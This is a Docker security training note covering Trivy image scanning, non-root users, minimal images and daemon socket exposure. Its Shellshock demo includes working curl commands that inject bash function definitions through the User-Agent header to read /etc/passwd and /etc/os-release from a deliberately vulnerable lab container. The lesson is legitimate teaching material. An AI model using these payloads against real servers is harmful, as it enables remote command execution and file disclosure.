# 🔐 25 — Docker Security Fundamentals

> **Session 7** | Tested on: AlmaLinux 9 | Author: Ganesh

Understanding Docker security is critical before running containers in production. Docker shares the host kernel — a misconfigured container can compromise the entire host. This note covers the full **Docker attack surface** and how to reduce it.

---

## 🎯 The Docker Attack Surface

Docker security involves protecting four distinct layers:

```
┌──────────────────────────────────┐
│         Your Application         │  ← App-level vulnerabilities
├──────────────────────────────────┤
│      Container Image / OS        │  ← CVEs, malicious packages
├──────────────────────────────────┤
│    Docker Daemon (dockerd)       │  ← Exposed API, misconfig
├──────────────────────────────────┤
│         Host Linux Kernel        │  ← Shared by all containers
└──────────────────────────────────┘
```

A vulnerability at any layer can cascade down to the host.

---

## 🚨 Security Rules — Quick Reference

| Rule | Why It Matters |
|---|---|
| **Use minimal base images** | Fewer packages = fewer CVEs |
| **Don't run containers as root** | Limits blast radius of exploits |
| **Restrict network access** | Containers shouldn't talk to each other unless needed |
| **Scan images for vulnerabilities** | Catch CVEs before deployment |
| **Use SELinux / AppArmor** | Kernel-level mandatory access control |
| **Monitor and log container activity** | Detect anomalies early |
| **Keep Docker and host OS updated** | Patch known exploits |
| **Don't give untrusted users Docker access** | Docker group = root-equivalent |
| **Avoid pulling from untrusted sources** | Malicious images are a real threat |
| **Enable Docker Content Trust (DCT)** | Ensure image authenticity |

---

## 🐚 Shellshock (CVE-2014-6271) — Live Demonstration

Shellshock is a classic bash vulnerability where specially crafted environment variables execute arbitrary code. It is a perfect example of why **image age and CVE scanning matter**.

### Understanding the Bug

```bash
# Normal bash behavior — this should just print "Hello"
env x='() { :; }; echo VULNERABLE' bash -c "echo Hello"

# If bash is vulnerable, output will be:
# VULNERABLE
# Hello
```

The `() { :; };` part defines a function. The `echo VULNERABLE` part **should not run** — but in vulnerable Bash, it does.

### Practical Demo with Docker

```bash
# Pull a known-vulnerable image (educational use only)
docker pull vulnerables/cve-2014-6271

# Run it with port mapping
docker run -d --name shellshock-test -p 8080:80 vulnerables/cve-2014-6271:latest

# Test the shellshock exploit via HTTP header injection
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/os-release'" \
  http://localhost:8080/cgi-bin/vulnerable

# Another exploit — read /etc/passwd remotely
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
  http://localhost:8080/cgi-bin/vulnerable
```

> [!CAUTION]
> The above commands are for **educational/lab purposes only**. Never test exploits on systems you don't own.

### Cleanup

```bash
docker stop shellshock-test
docker rm shellshock-test
docker rmi vulnerables/cve-2014-6271:latest -f
```

### Lesson Learned

- This image runs an **intentionally vulnerable Apache + CGI + Bash** stack
- The exploit injects shell commands via HTTP headers that get passed to Bash as environment variables
- **Modern Bash (≥ 4.3 patched) is not vulnerable** — this is why keeping software updated matters

---

## 🔍 Scanning Images with Trivy

**Trivy** is a fast, comprehensive vulnerability scanner for container images. It checks OS packages, application dependencies, and config files.

### Install Trivy on RHEL/AlmaLinux

```bash
# Add the Trivy repo (Aqua Security)
cat > /etc/yum.repos.d/trivy.repo << 'EOF'
[trivy]
name=Trivy repository
baseurl=https://aquasecurity.github.io/trivy-repo/rpm/releases/$releasever/$basearch/
gpgcheck=1
enabled=1
gpgkey=https://aquasecurity.github.io/trivy-repo/rpm/public.key
EOF

dnf install trivy -y

# Verify
trivy --version
```

### Scanning Images

```bash
# Scan a public image
trivy image ubuntu:latest

# Scan a local image
docker images
trivy image ubuntu_modded

# Scan with severity filter (only HIGH and CRITICAL)
trivy image --severity HIGH,CRITICAL ubuntu:latest

# Output as JSON (for pipelines)
trivy image --format json -o results.json ubuntu:latest

# Scan and fail if CRITICAL CVE found (for CI/CD)
trivy image --exit-code 1 --severity CRITICAL nginx:latest
```

### Sample Trivy Output

```
ubuntu:latest (ubuntu 22.04)
=====================================
Total: 21 (HIGH: 3, MEDIUM: 10, LOW: 8)

┌─────────────┬──────────────────┬──────────┬────────────────────────┐
│   Library   │  Vulnerability   │ Severity │     Fixed Version      │
├─────────────┼──────────────────┼──────────┼────────────────────────┤
│ libssl3     │ CVE-2023-5678    │ HIGH     │ 3.0.2-0ubuntu1.15      │
│ bash        │ CVE-2022-3715    │ MEDIUM   │ 5.1-6ubuntu1.1         │
└─────────────┴──────────────────┴──────────┴────────────────────────┘
```

### Best Practices for Image Scanning

```bash
# 1. Always scan before pushing to registry
trivy image myapp:latest && docker push myapp:latest

# 2. Scan in CI pipeline — fail build on CRITICAL
trivy image --exit-code 1 --severity CRITICAL myapp:latest

# 3. Use minimal base images to reduce CVE count
# Instead of: FROM ubuntu:latest  (200+ packages)
# Use:        FROM alpine:latest  (5-10 packages)
# Or:         FROM scratch        (literally nothing)
```

---

## 🛡️ Reducing the Docker Attack Surface

### 1. Use Minimal Base Images

```dockerfile
# ❌ Bloated — hundreds of packages, many CVEs
FROM ubuntu:latest

# ✅ Minimal — ~5MB, very few packages
FROM alpine:latest

# ✅ Best — only your app binary, zero shell, zero OS
FROM scratch
```

### 2. Don't Run as Root Inside Containers

```dockerfile
FROM alpine:latest

# Create a non-root user
RUN addgroup -S appgroup && adduser -S appuser -G appgroup

# Switch to the non-root user before CMD
USER appuser

CMD ["./myapp"]
```

```bash
# Verify container is not running as root
docker exec mycontainer whoami
# Output should be: appuser (not root)
```

### 3. Use a Private Registry with Image Scanning

```bash
# Run a local registry
docker run -d -p 5000:5000 --name local-registry registry:2

# Scan before pushing
trivy image myapp:v1

# Only push if scan passes
docker tag myapp:v1 localhost:5000/myapp:v1
docker push localhost:5000/myapp:v1
```

### 4. Use Security Monitoring Tools

```bash
# Monitor running containers in real time
docker stats

# Review container logs for anomalies
docker logs -f mycontainer

# Use docker events for activity stream
docker events --filter type=container
```

### 5. Keep Docker and Host Updated

```bash
# Update Docker packages
dnf update 'docker*' -y

# Apply OS security patches
dnf upgrade --security -y

# Check Docker version
docker --version
docker info | grep "Server Version"
```

---

## 🔒 Docker Daemon Security

The Docker daemon runs as **root** and listens on a Unix socket `/var/run/docker.sock`. Anyone with access to this socket has **root-equivalent** access to the host.

```bash
# Default: secure Unix socket only
ls -la /var/run/docker.sock
# srw-rw----. 1 root docker 0 ...

# Who is in the docker group? (These users have root-equivalent power)
cat /etc/group | grep docker

# NEVER expose the daemon over TCP without TLS
# ❌ Dangerous — anyone on the network can control Docker
# { "hosts": ["tcp://0.0.0.0:2375"] }  ← DO NOT DO THIS

# ✅ Safe — TLS-protected TCP (if remote access is needed)
# { "hosts": ["tcp://0.0.0.0:2376"], "tls": true }
```

---

## 📝 Common Mistakes in Docker Security

| ❌ Wrong | ✅ Correct |
|---|---|
| `FROM ubuntu:latest` for production | Use `FROM alpine` or distroless |
| Running app as `root` inside container | `USER nonroot` in Dockerfile |
| Exposing daemon: `"hosts": ["tcp://0.0.0.0:2375"]` | Use TLS or keep socket only |
| Adding dev to `docker` group casually | Only trusted admins get Docker access |
| Never scanning images | Scan with Trivy in CI/CD pipeline |
| Using `--privileged` for everything | Use only specific capabilities needed |
| Ignoring `docker events` | Monitor container lifecycle events |

---

## ⚡ Quick Reference

```bash
# Trivy — scan image
trivy image ubuntu:latest
trivy image --severity HIGH,CRITICAL myapp:latest

# Monitor events
docker events --filter type=container

# Check who has Docker access
cat /etc/group | grep docker

# Check if container runs as root
docker inspect mycontainer | grep -i user

# Real-time resource + process monitoring
docker stats
docker exec mycontainer ps aux
```

---

> [!TIP]
> **Next:** [26 — Docker Security Profiles (seccomp, capabilities, SELinux, AppArmor, DCT)](26-security-profiles-seccomp-capabilities-dct.md)

---

*← [24 — Docker Swarm Auto Scaling](24-docker-swarm-auto-scaling.md) | [26 — Security Profiles →](26-security-profiles-seccomp-capabilities-dct.md)*
